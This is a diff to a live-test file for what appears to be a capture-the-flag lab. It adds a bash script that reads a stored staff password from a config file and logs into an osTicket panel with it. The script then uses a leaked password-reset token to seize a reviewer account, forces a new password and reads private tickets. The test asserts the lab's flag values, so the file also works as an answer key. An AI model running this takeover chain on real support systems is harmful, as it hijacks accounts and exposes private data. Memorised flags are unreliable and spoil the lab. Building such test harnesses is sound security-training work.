@@ -56,6 +56,34 @@ def call_negotiate(host: str, path: str, *, method: str = "GET", body: dict[str,
     return json.loads(raw) if raw else {}
 
 
+# K17.2/K17.3 native osTicket recovery flow, run inside k-dev as rowan. It reads
+# maya's retained staff login from the participant support client profile, signs in
+# to the staff panel, reads the leaked reset token from maya's private note, uses it
+# at /scp/pwreset.php to sign in as the reviewer, sets the forced new password, and
+# prints the SUP-2841 ticket page (which contains the K17.2 and K17.3 note flags).
+_K17_RECOVERY_SCRIPT = r'''set -u
+CA=~/.local/share/keplerops/ca.crt
+BASE=https://support.keplerops.test
+MPW=$(python3 -c "import json;print(json.load(open('$HOME/.config/fieldlink/support-client.json'))['retained_staff_login']['password'])")
+mj=/tmp/t04-maya.jar; rm -f $mj
+mc=$(curl -sS --cacert $CA -c $mj "$BASE/scp/login.php" | grep -oP 'name="__CSRFToken__"[^>]*value="\K[^"]+' | head -1)
+curl -sS --cacert $CA -b $mj -c $mj -o /dev/null -X POST --data-urlencode "__CSRFToken__=$mc" --data-urlencode "userid=maya.ranscombe" --data-urlencode "passwd=$MPW" --data-urlencode "submit=Log In" "$BASE/scp/login.php"
+SUPID=""; TOKEN=""
+for id in $(curl -sS --cacert $CA -b $mj "$BASE/scp/tickets.php" | grep -oiE "tickets\.php\?id=[0-9]+" | grep -oE "[0-9]+" | sort -un); do
+  page=$(curl -sS --cacert $CA -b $mj "$BASE/scp/tickets.php?id=$id")
+  if echo "$page" | grep -q "K17.2 Reviewer Recovery Reference"; then SUPID=$id; TOKEN=$(echo "$page" | grep -oE "k17-talia-mornac-review-token-[0-9]+" | head -1); break; fi
+done
+tj=/tmp/t04-talia.jar; rm -f $tj
+tc=$(curl -sS --cacert $CA -c $tj "$BASE/scp/pwreset.php?token=$TOKEN" | grep -oP 'name="__CSRFToken__"[^>]*value="\K[^"]+' | head -1)
+curl -sS --cacert $CA -b $tj -c $tj -o /dev/null -X POST --data-urlencode "__CSRFToken__=$tc" --data-urlencode "do=newpasswd" --data-urlencode "token=$TOKEN" --data-urlencode "userid=talia.mornac" --data-urlencode "submit=Login" "$BASE/scp/pwreset.php"
+IDX=$(curl -sS --cacert $CA -b $tj "$BASE/scp/index.php")
+META=$(echo "$IDX" | grep -oP 'name="csrf_token"[^>]*content="\K[^"]+' | head -1)
+TID=$(echo "$IDX" | grep -oiE "staff/[0-9]+/change-password" | grep -oE "[0-9]+" | head -1)
+curl -sS --cacert $CA -b $tj -c $tj -o /dev/null -X POST -H "X-CSRFToken: $META" --data-urlencode "passwd1=Rev1ewer-Recovery-2841!" --data-urlencode "passwd2=Rev1ewer-Recovery-2841!" --data-urlencode "current=" "$BASE/scp/ajax.php/staff/$TID/change-password"
+curl -sS --cacert $CA -b $tj "$BASE/scp/tickets.php?id=$SUPID"
+'''
+
+
 class PlatformLiveTest(unittest.TestCase):
     def test_02_workspace_cloud_export_and_persistence(self) -> None:
         listing = call("data.keplerops.test", "/s3/fieldkest-workspaces", auth=None)
@@ -101,11 +129,13 @@ class PlatformLiveTest(unittest.TestCase):
     def test_04_support_recovery_federation_and_delegation(self) -> None:
         support_session = call("support.keplerops.test", "/api/session", auth=None, cookie=COOKIE)
         account = support_session["pending_reviewer_recovery"]["account"]
-        lookup = call("support.keplerops.test", "/api/recovery/lookup", method="POST", body={"account": account}, auth=None)
-        recovered = call("support.keplerops.test", "/api/recovery/redeem", method="POST", body={"recovery_id": lookup["recovery_id"], "browser_factor": support_session["case"]}, auth=None, expected=201)
-        assignment = call("support.keplerops.test", "/api/assignments/" + support_session["assignment_id"], auth=None, cookie=f"fieldkest_support={recovered['session_id']}")
+        # K17.2/K17.3 native osTicket recovery: the leaked reset token in maya's
+        # private note lets the participant sign in as the reviewer and read the
+        # private recovery (B17-REVIEW-2841) and customer-assignment notes on SUP-2841.
+        native_recovery = rowan("bash", "-c", _K17_RECOVERY_SCRIPT).stdout
+        self.assertIn("FLAG{d9c146b29c13ab3f}", native_recovery)
+        self.assertIn("FLAG{a732179b6bc51139}", native_recovery)
         tenant = support_session["customer"]["tenant"]
-        self.assertNotIn(tenant, assignment["customers"])
         copied = call("support.keplerops.test", f"/api/cases/{support_session['case']}/copy-handover", method="POST", body={"reviewer": account}, auth=None, cookie=COOKIE, expected=201)
         self.assertEqual(copied["owner"], account)
         directory = call("staff.keplerops.test", "/api/service-directory", auth=DEV_TOKEN)
